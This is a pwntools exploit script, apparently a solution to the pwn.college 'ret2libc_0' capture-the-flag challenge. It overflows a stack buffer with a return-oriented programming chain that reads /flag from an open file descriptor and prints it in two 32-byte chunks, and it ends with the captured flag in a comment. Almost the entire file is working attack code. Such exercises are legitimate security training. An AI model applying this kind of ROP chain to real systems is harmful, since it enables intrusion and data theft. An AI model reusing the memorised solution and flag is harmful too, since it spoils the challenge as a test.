#!/usr/bin/python

from pwn import *

context(arch="amd64", os="linux")

# gadgets
buf_addr = 0x404050 # .data
pop_rdi = 0x401503 # pop rdi; ret
pop_rsi = 0x401501 # pop rsi; pop r15; ret
pop_rdx = 0x401285 # pop rdx; ret

read_addr = 0x4010D0
puts_addr = 0x4010A0


payload = cyclic(0x30)  # 填满缓冲区
payload += cyclic(0x8)  # saved_rbp

payload += p64(pop_rdx)
payload += p64(0x20) # rdx = 0x20, 太大.data装不下，分两次读flag

payload += p64(pop_rsi)
payload += p64(buf_addr) # rsi = buf
payload += cyclic(8)

payload += p64(pop_rdi)
payload += p64(3) # rdi = 3

payload += p64(read_addr) # read(3, buf, 0x20)

payload += p64(pop_rdi)
payload += p64(buf_addr) # rdi = buf

payload += p64(puts_addr) # puts(buf)


payload += p64(pop_rdx)
payload += p64(0x20) # rdx = 0x20

payload += p64(pop_rsi)
payload += p64(buf_addr) # rsi = buf
payload += cyclic(8)

payload += p64(pop_rdi)
payload += p64(3) # rdi = 3

payload += p64(read_addr) # read(3, buf, 0x20)

payload += p64(pop_rdi)
payload += p64(buf_addr) # rdi = buf

payload += p64(puts_addr) # puts(buf)


sh = process("/challenge/ret2libc_0")
sh.sendlineafter(b"Choice >> ", b'2')
sh.sendlineafter(b"Input file name:", b"/flag")
sh.sendlineafter(b"Choice >> ", b'4')
sh.sendafter(b"Input your message:", payload)
sh.interactive()

# pwn.college{UeGatv3iy6XzS8yR1ZvSsza7K3q.QX4IDLyEzW}
